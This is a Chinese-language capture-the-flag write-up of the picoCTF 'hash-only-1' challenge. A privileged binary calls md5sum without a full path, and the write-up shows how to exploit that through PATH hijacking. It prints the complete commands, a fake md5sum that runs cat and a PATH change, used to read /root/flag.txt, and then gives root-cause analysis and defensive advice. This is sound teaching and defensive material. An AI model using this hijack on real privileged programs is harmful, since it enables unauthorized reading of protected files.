## Challenge Metadata

- **Platform:** picoCTF
- **Category:** Binary Exploitation
- **Difficulty:** Medium
- **Author:** Bryan
- **Date:** 2026-3-13

## 一、基本資訊

- **題目名稱：** hash-only-1
- **題目類型：** Binary Exploitation
- **平台：** picoCTF 2025
- **目標：** 取得受保護檔案 `/root/flag.txt` 的明文內容

## 二、題目概述

本題提供一個名為 `flaghasher` 的執行檔。根據題目描述，該程式具備讀取 flag 檔案內容的權限，但程式只會回傳 flag 的 hash 值，而不會直接輸出 flag 明文。

表面上看起來題目似乎是在考驗 hash 還原能力，但實際分析後可發現，真正的攻擊面並不在於逆向 hash，而是在於程式呼叫外部系統指令的方式存在安全缺陷。攻擊者可藉由操控系統搜尋指令的路徑，使程式執行惡意替代指令，最終直接讀出 flag 內容。

## 三、分析目標

本次分析的主要目標如下：

1. 確認 `flaghasher` 的內部執行流程
2. 找出可被利用的弱點
3. 撰寫並執行 exploit
4. 取得 flag 明文
5. 說明此弱點的成因與防禦方式

## 四、靜態分析

首先對題目提供的 binary 進行字串分析，使用以下指令：

```bash
strings flaghasher | grep -E "sha1|md5|cat|sh|bash|sum"
```

分析結果顯示程式內含以下關鍵字串：

- `Computing the MD5 hash of /root/flag.txt...`
- `/bin/bash -c 'md5sum /root/flag.txt'`

由上述資訊可得知：

- 程式實際使用的是 MD5，而非 SHA-1
- 程式會透過 `/bin/bash -c` 執行外部 shell 指令
- 被執行的指令內容為：`md5sum /root/flag.txt`

這代表程式並非自行實作雜湊運算，而是依賴系統指令 `md5sum` 來完成工作。

## 五、弱點判定

### 5.1 弱點描述

雖然程式呼叫 shell 時使用了完整路徑 `/bin/bash`，但其內部執行的 `md5sum` 卻沒有指定完整路徑，例如：

- 應為：`/usr/bin/md5sum /root/flag.txt`
- 目前：`md5sum /root/flag.txt`

在 Unix/Linux 系統中，當 shell 執行未指定完整路徑的指令時，會依照 `PATH` 環境變數中的目錄順序搜尋對應的可執行檔。

若攻擊者能夠：

1. 自行建立一個同名的惡意程式 `md5sum`
2. 將目前目錄放到 `PATH` 的最前面

則目標程式在呼叫 `md5sum` 時，就會優先執行攻擊者提供的假程式，而不是系統原本的真正 `md5sum`。

### 5.2 弱點類型

- PATH Hijacking
- Command Hijacking
- Insecure External Command Execution

### 5.3 風險說明

由於 `flaghasher` 本身具備讀取 `/root/flag.txt` 的權限，因此只要攻擊者成功劫持其外部指令流程，就能借用該程式的權限執行任意替代動作。

本題中，攻擊者不需要破解 MD5，也不需要提權，只需讓程式把原本應該執行的 `md5sum` 替換成輸出檔案內容的指令，即可直接讀出 flag。

## 六、攻擊思路

原始執行流程如下：

`/bin/bash -c 'md5sum /root/flag.txt'`

理想情況下，系統會執行真正的 `md5sum`，輸出 hash 值。

但若建立假的 `md5sum` 腳本：

```bash
#!/bin/sh
/bin/cat "$@"
```

則當 `flaghasher` 執行 `md5sum /root/flag.txt` 時，實際效果會變成：

`/bin/cat /root/flag.txt`

如此即可直接印出 flag 明文。

## 七、利用過程

### 7.1 建立惡意 md5sum

在題目遠端環境中建立一個名為 `md5sum` 的腳本：

```bash
cat > md5sum << 'EOF'
#!/bin/sh
/bin/cat "$@"
EOF
```

### 7.2 設定執行權限

```bash
chmod +x md5sum
```

### 7.3 修改 PATH 搜尋順序

將目前目錄 `.` 放到 `PATH` 最前方：

```bash
export PATH=.:$PATH
```

### 7.4 執行目標程式

```bash
./flaghasher
```

## 八、利用結果

執行後成功取得 flag 

## 九、完整 exploit 指令

```bash
cat > md5sum << 'EOF'
#!/bin/sh
/bin/cat "$@"
EOF

chmod +x md5sum
export PATH=.:$PATH
./flaghasher
```

## 十、成因分析

本題弱點產生的主要原因，在於程式設計者在執行外部指令時，未遵循安全實作原則。

問題點如下：

1. 使用 shell 執行外部命令
   - 程式透過：`/bin/bash -c 'md5sum /root/flag.txt'` 執行 shell 指令，這本身就會增加攻擊面。
2. 未指定完整執行路徑
   - 若程式改為：`/usr/bin/md5sum /root/flag.txt` 就可避免單純的 PATH 劫持。
3. 依賴外部命令處理敏感資料
   - 程式本身擁有讀取敏感檔案的權限，卻把後續操作交給外部命令，造成權限可被間接利用。

## 十一、防禦建議

為避免此類問題，可採取以下措施：

### 11.1 指定完整路徑

執行系統指令時，應明確指定完整路徑，例如：

`/usr/bin/md5sum`

避免 shell 透過 `PATH` 搜尋不受信任的檔案。

### 11.2 避免使用 system() 或 bash -c

能不透過 shell 執行就不要透過 shell執行。若只是要計算檔案 hash，應直接使用程式語言內建函式庫或安全 API。

### 11.3 最小權限原則

若程式必須接觸敏感資料，應盡量縮小其權限範圍，降低被利用後造成的影響。

### 11.4 清理環境變數

對高權限程式而言，應避免直接信任使用者可控的環境變數，例如 `PATH`。

## 十二、結論

本題的表面主題雖然是 hash，但真正的考點在於外部命令呼叫的安全性。透過靜態分析可發現 `flaghasher` 使用 `/bin/bash -c 'md5sum /root/flag.txt'` 執行系統指令，而 `md5sum` 未指定完整路徑，導致攻擊者可透過 PATH Hijacking 建立惡意替代程式，最終直接讀取本來不應顯示的 flag 內容。

此案例說明，在具備高權限的程式中，若外部指令呼叫設計不當，即使表面上功能看似單純，也可能成為嚴重的安全漏洞。

## 十三、附錄：關鍵觀念整理

| 項目 | 說明 |
| --- | --- |
| 弱點名稱 | PATH Hijacking |
| 利用條件 | 程式呼叫未指定完整路徑的外部命令 |
| 利用方式 | 建立同名惡意可執行檔並修改 PATH |
| 攻擊效果 | 劫持原本應執行的系統命令 |
| 本題成果 | 成功將 md5sum 替換為 cat，直接讀取 flag |

## 使用工具

- strings
- Linux shell
- PATH manipulation